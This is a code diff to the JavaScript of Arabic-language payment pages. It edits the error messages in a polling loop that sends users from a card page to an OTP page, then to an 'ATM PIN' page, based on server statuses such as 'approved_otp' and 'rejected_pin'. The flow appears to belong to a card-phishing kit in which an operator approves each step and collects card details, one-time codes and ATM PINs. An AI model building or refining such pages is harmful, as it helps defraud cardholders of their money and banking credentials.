@@ -35,17 +35,17 @@
                 if (data.status === 'approved_payment') {
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_payment') {
-                    localStorage.setItem('lastError', data.lastError || 'تم رفض عملية الدفع بطاقك غير متاح للدفع عبر الإنترنت يرجي التواصل مع المصرف او تجربة طرق دفع اخري');
+                    localStorage.setItem('lastError', data.lastError || 'تم رفض عملية الدفع بطاقك غير متاح للدفع عبر الانترنت يرجي التواصل مع المصرف او تجربة طرق دفع اخري');
                     window.location.href = `payment_card_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'approved_otp') {
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_otp') {
-                    localStorage.setItem('lastError', data.lastError || 'الرمز غير صالح او بطاقك غير متاح لدفع عبر الإنترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
+                    localStorage.setItem('lastError', data.lastError || 'الزمر غير صالح او بطاقك غير متاح لدفع عبر الانترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'approved_pin') {
                     window.location.href = `payment_success_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_pin') {
-                    localStorage.setItem('lastError', data.lastError || 'الرقم السري غير صحيح او بطاقك غير متاح لدفع عبر الإنترنت يرجي التوصل مع المصرف استخدام طرق دفع اخري');
+                    localStorage.setItem('lastError', data.lastError || 'رقم الصراف الي غير صحيح قد تكون بطاقتك غير متاحه للدفع عبر الانترنت يرجي التواصل مع المصرف او استخدام طرق دفع مختلفه');
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else {
                     setTimeout(checkStatus, 2000);
